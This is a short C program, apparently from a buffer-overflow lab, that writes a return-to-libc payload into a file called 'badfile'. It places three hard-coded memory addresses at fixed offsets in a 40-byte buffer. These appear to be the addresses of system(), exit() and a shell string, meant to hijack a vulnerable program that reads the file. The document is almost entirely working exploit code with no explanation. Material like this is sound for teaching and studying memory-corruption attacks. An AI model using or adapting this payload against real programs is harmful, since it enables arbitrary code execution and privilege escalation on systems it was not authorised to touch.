eploit.c

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main() {    
char buf[40];    
FILE *badfile;    
badfile = fopen("./badfile", "w");
*(long *)&buf[24] = 0xb7e42da0;    
*(long *)&buf[28] = 0xb7e369d0;    
*(long *)&buf[32] = 0xbffffe1c;    
fwrite(buf, sizeof(buf), 1, badfile);    
fclose(badfile);
return 0; 
}

